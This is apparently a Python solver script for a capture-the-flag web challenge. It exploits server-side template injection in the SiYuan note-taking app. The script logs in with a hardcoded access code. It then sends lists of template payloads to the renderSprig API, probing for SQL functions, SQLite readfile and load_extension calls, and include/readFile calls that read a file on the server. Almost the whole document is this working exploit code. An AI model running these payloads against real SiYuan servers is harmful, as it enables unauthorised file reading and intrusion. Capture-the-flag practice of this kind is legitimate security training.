#!/usr/bin/env python3
"""
Null CTF 2025 - Archivists Whisper
Category: Web

Target: SiYuan note-taking app (Go backend)
Goal: Read /flag_random.txt via SSTI
"""

import requests
import sys

# =============================================================================
# CONFIGURATION
# =============================================================================
BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://192.168.4.205:6806"
AUTH_CODE = "SuperSecretPassword"  # From Dockerfile

# =============================================================================
# AUTHENTICATION
# =============================================================================

def authenticate(session: requests.Session) -> bool:
    """Authenticate to SiYuan using the access code."""

    # Try the login endpoint
    resp = session.post(
        f"{BASE_URL}/api/system/loginAuth",
        json={"authCode": AUTH_CODE}
    )
    print(f"[*] Login attempt 1: {resp.status_code} - {resp.text[:100]}")

    if resp.status_code == 200 and resp.json().get("code") == 0:
        print("[+] Authenticated successfully!")
        return True

    # Try alternate endpoint format
    resp = session.post(
        f"{BASE_URL}/api/system/login",
        json={"accessAuthCode": AUTH_CODE}
    )
    print(f"[*] Login attempt 2: {resp.status_code} - {resp.text[:100]}")

    if resp.status_code == 200 and resp.json().get("code") == 0:
        print("[+] Authenticated successfully!")
        return True

    # Check if we're already authenticated by testing an endpoint
    resp = session.post(
        f"{BASE_URL}/api/template/renderSprig",
        json={"template": "{{now}}"}
    )
    print(f"[*] Auth test: {resp.status_code} - {resp.text[:100]}")

    if resp.status_code == 200 and resp.json().get("code") == 0:
        print("[+] Already authenticated!")
        return True

    print("[-] Authentication failed")
    return False

# =============================================================================
# SSTI TESTING
# =============================================================================

def test_ssti(session: requests.Session, payload: str, verbose: bool = True) -> dict:
    """Test SSTI payload via renderSprig."""
    resp = session.post(
        f"{BASE_URL}/api/template/renderSprig",
        json={"template": payload}
    )

    if verbose:
        print(f"\n[*] Payload: {payload}")
        print(f"[*] Response: {resp.text[:500]}")

    return resp.json()

# =============================================================================
# MAIN
# =============================================================================

def main():
    session = requests.Session()

    print("=" * 60)
    print("Archivists Whisper - SSTI Exploit")
    print("=" * 60)
    print(f"[*] Target: {BASE_URL}")
    print(f"[*] Auth code: {AUTH_CODE}")
    print()

    # Authenticate
    if not authenticate(session):
        print("[-] Cannot proceed without authentication")
        return

    print()
    print("=" * 60)
    print("Testing SQL Template Functions")
    print("=" * 60)

    # Test various SQL function names
    sql_payloads = [
        '{{sql "SELECT 1"}}',
        '{{SQL "SELECT 1"}}',
        '{{query "SELECT 1"}}',
        '{{queryRow "SELECT 1"}}',
        '{{queryBlocks "SELECT * FROM blocks LIMIT 1"}}',
        '{{QueryBlocks "SELECT * FROM blocks LIMIT 1"}}',
        '{{sqlQuery "SELECT 1"}}',
    ]

    working_sql = None
    for payload in sql_payloads:
        result = test_ssti(session, payload, verbose=True)
        if result.get("code") == 0 and "not defined" not in result.get("msg", ""):
            print(f"\n[+] FOUND WORKING SQL FUNCTION: {payload}")
            working_sql = payload
            break

    if working_sql:
        print()
        print("=" * 60)
        print("Attempting File Read via SQLite")
        print("=" * 60)

        # Extract the function name
        func_name = working_sql.split('"')[0].strip('{').strip()

        # Try readfile
        file_payloads = [
            f'{{{{{func_name} "SELECT readfile(\'/flag_random.txt\')"}}}}',
            f'{{{{{func_name} "SELECT load_extension(\'fileio\'); SELECT readfile(\'/flag_random.txt\')"}}}}',
        ]

        for payload in file_payloads:
            test_ssti(session, payload)

    print()
    print("=" * 60)
    print("Testing Other Potential Functions")
    print("=" * 60)

    # Test other functions that might read files
    other_payloads = [
        '{{include "/flag_random.txt"}}',
        '{{readFile "/flag_random.txt"}}',
        '{{cat "/flag_random.txt"}}',
        '{{.ReadFile "/flag_random.txt"}}',
        '{{getHPathByID "test"}}',
        '{{statBlock "test"}}',
    ]

    for payload in other_payloads:
        test_ssti(session, payload, verbose=True)

if __name__ == "__main__":
    main()